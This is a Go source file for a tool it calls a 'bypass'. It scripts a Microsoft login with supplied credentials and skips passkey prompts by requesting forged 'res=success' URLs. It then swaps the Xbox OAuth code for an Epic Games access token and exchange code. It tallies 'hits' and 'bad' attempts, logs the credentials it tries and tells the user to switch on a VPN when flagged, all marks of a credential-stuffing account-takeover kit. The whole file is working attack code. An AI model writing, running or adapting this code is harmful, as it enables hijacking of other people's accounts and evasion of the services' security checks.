package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"
)

var exchangeCode string

func BypassCheck() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("Enter Email: ")
	email, _ := reader.ReadString('\n')
	email = strings.TrimSpace(email)

	fmt.Print("Enter Password: ")
	password, _ := reader.ReadString('\n')
	password = strings.TrimSpace(password)

	if bypassAccount(email, password) {
		LogSuccess(fmt.Sprintf("[BYPASSED] - %s:%s", email, strings.Repeat("*", len(password))))
		AddToHits(1)

		LogInfo("[1] Open Web Dashboard")
		LogInfo("[2] Main Menu")
		fmt.Print("> ")

		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(choice)

		if choice == "1" {
			openBrowser(fmt.Sprintf("https://www.epicgames.com/id/exchange?exchangeCode=%s&redirectUrl=https://www.epicgames.com/account/personal", exchangeCode))
			fmt.Println("Press Enter to return to the main menu...")
			reader.ReadString('\n')
		}
	} else {
		AddToBad(1)
		fmt.Println("Bypass failed. Press Enter to return to the main menu...")
		reader.ReadString('\n')
	}
}

func bypassAccount(email, password string) bool {
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Don't follow redirects automatically
		},
		Timeout: 30 * time.Second,
	}

	var resp *http.Response
	var err error

	// 1. Initial GET to outlook to start the flow and get the correct login URL
	for {
		req, _ := http.NewRequest("GET", "https://outlook.live.com/owa/?nlp=1", nil)
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36")
		req.Header.Set("Pragma", "no-cache")
		req.Header.Set("Accept", "*/*")
		
		resp, err = client.Do(req)
		if err != nil {
			LogError(fmt.Sprintf("[!] Error: %v", err))
			time.Sleep(1 * time.Second)
			continue
		}
		
		location := resp.Header.Get("Location")
		if location != "" && strings.Contains(location, "login.live.com") {
			resp.Body.Close() // Close the body of the redirect response
			resp, err = client.Get(location) // Follow the redirect manually
			if err != nil {
				LogError(fmt.Sprintf("[!] Error: %v", err))
				time.Sleep(1 * time.Second)
				continue
			}
			break
		}
		resp.Body.Close()
	}
	defer resp.Body.Close()

	// 2. Parse the login page for PPFT and post URL
	bodyBytes, _ := ioutil.ReadAll(resp.Body)
	content := string(bodyBytes)
	
	// The Python script replaces spaces and backslashes which might be unnecessary but we do it for 1:1
	contentForParsing := strings.ReplaceAll(content, "\\", "")
	contentForParsing = strings.ReplaceAll(contentForParsing, " ", "")
	
	ppft := Parse(contentForParsing, `value="`, `"`)
	postURL := Parse(contentForParsing, `"urlPost":"`, `"`)

	if ppft == "" || postURL == "" {
		LogError("[!] Could not parse PPFT or post URL from login page.")
		return false
	}

	// 3. Post login credentials
	loginData := url.Values{
		"i13": {"0"}, "login": {email}, "loginfmt": {email}, "type": {"11"},
		"LoginOptions": {"3"}, "passwd": {password}, "ps": {"2"}, "PPFT": {ppft},
		"PPSX": {"Passport"}, "NewUser": {"1"}, "fspost": {"0"}, "i21": {"0"},
		"CookieDisclosure": {"0"}, "IsFidoSupported": {"0"}, "isSignupPost": {"0"},
		"isRecoveryAttemptPost": {"0"}, "i19": {"17299"},
	}
	
	resp, err = client.PostForm(postURL, loginData)
	if err != nil {
		LogError(fmt.Sprintf("[!] Error during login post: %v", err))
		return false
	}
	defer resp.Body.Close()
	
	bodyBytes, _ = ioutil.ReadAll(resp.Body)
	content = string(bodyBytes)

	if resp.StatusCode == 429 || strings.Contains(content, "Too many requests") {
		LogError("[!] Too many requests, please wait a few minutes and try again.")
		return false
	}

	// 4. Handle intermediate redirects (passkey, cancel, abuse)
	actionURLRegex := regexp.MustCompile(`action="([^"]+)"`)
	matches := actionURLRegex.FindStringSubmatch(content)

	if len(matches) > 1 {
		actionURL := matches[1]

		if strings.Contains(actionURL, "Abuse?mkt=") || strings.Contains(actionURL, "recover?mkt=") {
			LogError(fmt.Sprintf("[-] Failed Login: %s:%s - Abuse/Recovery", email, password))
			return false
		}

		if strings.Contains(actionURL, "passkey?mkt=") || strings.Contains(actionURL, "cancel?mkt=") {
			parsedURL, _ := url.Parse(actionURL)
			ruParam := parsedURL.Query().Get("ru")
			if ruParam != "" {
				decodedRu, _ := url.QueryUnescape(ruParam)
				ruURL, _ := url.Parse(decodedRu)
				opid := ruURL.Query().Get("opid")
				opidt := ruURL.Query().Get("opidt")

				if opid != "" && opidt != "" {
					var successURL string
					if strings.Contains(actionURL, "passkey?mkt=") {
						LogWarning(fmt.Sprintf("[!] Passkey found: %s:%s", email, password))
						successURL = fmt.Sprintf("https://login.live.com/login.srf?id=292841&opid=%s&opidt=%s&res=success", opid, opidt)
					} else { // cancel?mkt=
						successURL = fmt.Sprintf("https://login.live.com/login.srf?id=38936&opid=%s&opidt=%s&res=success", opid, opidt)
					}

					successResp, err := client.Get(successURL)
					if err == nil {
						// Check for abuse again in the response of this redirect
						successBodyBytes, _ := ioutil.ReadAll(successResp.Body)
						successContent := string(successBodyBytes)
						if strings.Contains(successContent, "Abuse?mkt=") || strings.Contains(successContent, "recover?mkt=") {
							LogError(fmt.Sprintf("[-] Failed Login: %s:%s - Abuse/Recovery", email, password))
							successResp.Body.Close()
							return false
						}
						successResp.Body.Close()
					}
				} else {
					LogError(fmt.Sprintf("[-] Failed to extract login parameters: %s:%s", email, password))
					return false
				}
			}
		}
	}

	// 5. Get the final authorization URL
	authURL := "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup"
	resp, err = client.Get(authURL)
	if err != nil {
		LogError(fmt.Sprintf("[!] Error on auth_url get: %v", err))
		return false
	}
	defer resp.Body.Close()

	bodyBytes, _ = ioutil.ReadAll(resp.Body)
	content = string(bodyBytes)

	// 6. Handle another layer of intermediate forms (cancel/passkey after auth_url)
	if strings.Contains(content, "cancel?mkt=") || strings.Contains(content, "passkey?mkt=") {
		formURL := Parse(content, `action="`, `"`)
		if ruStr := Parse(formURL, "ru=", "&"); ruStr != "" {
			if ruStr == "" {
				ruStr = Parse(formURL, "ru=", "")
			}
			decodedRu, _ := url.QueryUnescape(ruStr)
			successRuUrl := decodedRu + "&res=success"
			
			resp, err = client.Get(successRuUrl)
			if err != nil {
				LogError(fmt.Sprintf("[!] Error on second ru redirect: %v", err))
				return false
			}

			// The python script re-requests the auth_url after this.
			resp.Body.Close()
			resp, err = client.Get(authURL)
			if err != nil {
				LogError(fmt.Sprintf("[!] Error on final auth_url get: %v", err))
				return false
			}

		}
	}
	
	if strings.Contains(content, "Human verification") {
		LogError("[!] Your IP has been flagged by epic games, please turn on a vpn and restart.")
		return false
	}

	// 7. Extract the final authorization code
	location := resp.Header.Get("Location")
	if location == "" {
		LogError("[!] No authorization code found in redirect URL")
		return false
	}
	
	authCodeParts := strings.Split(location, "code=")
	if len(authCodeParts) < 2 {
		LogError("[!] No authorization code found in redirect URL")
		return false
	}
	authCode := authCodeParts[1]
	
	// 8. Exchange auth code for access token
	tokenData := url.Values{
		"grant_type":          {"external_auth"},
		"external_auth_type":  {"xbl"},
		"external_auth_token": {authCode},
	}
	
	req, _ := http.NewRequest("POST", "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", strings.NewReader(tokenData.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Authorization", "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ=")
	
	resp, err = client.Do(req)
	if err != nil {
		LogError(fmt.Sprintf("[!] Error getting access token: %v", err))
		return false
	}
	defer resp.Body.Close()

	bodyBytes, _ = ioutil.ReadAll(resp.Body)
	content = string(bodyBytes)

	if strings.Contains(content, "errors.com.epicgames.account.no_account_found_for_external_auth") {
		LogError("[!] Invalid Login - No Epic account found for this Microsoft account.")
		return false
	}

	var tokenResponse map[string]interface{}
	json.Unmarshal(bodyBytes, &tokenResponse)
	accessToken, ok := tokenResponse["access_token"].(string)
	if !ok || accessToken == "" {
		LogError(fmt.Sprintf("[!] Could not get access token. Response: %s", content))
		return false
	}

	// 9. Get final exchange code
	req, _ = http.NewRequest("GET", "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", nil)
	req.Header.Set("Authorization", "Bearer "+accessToken)

	resp, err = client.Do(req)
	if err != nil {
		LogError(fmt.Sprintf("[!] Error getting exchange code: %v", err))
		return false
	}
	defer resp.Body.Close()

	bodyBytes, _ = ioutil.ReadAll(resp.Body)
	exchangeCode = Parse(string(bodyBytes), `code":"`, `"`)

	return exchangeCode != ""
}

// openBrowser opens the specified URL in the default browser on Windows.
func openBrowser(url string) {
	err := exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	if err != nil {
		LogError(fmt.Sprintf("Failed to open browser: %v", err))
	}
}
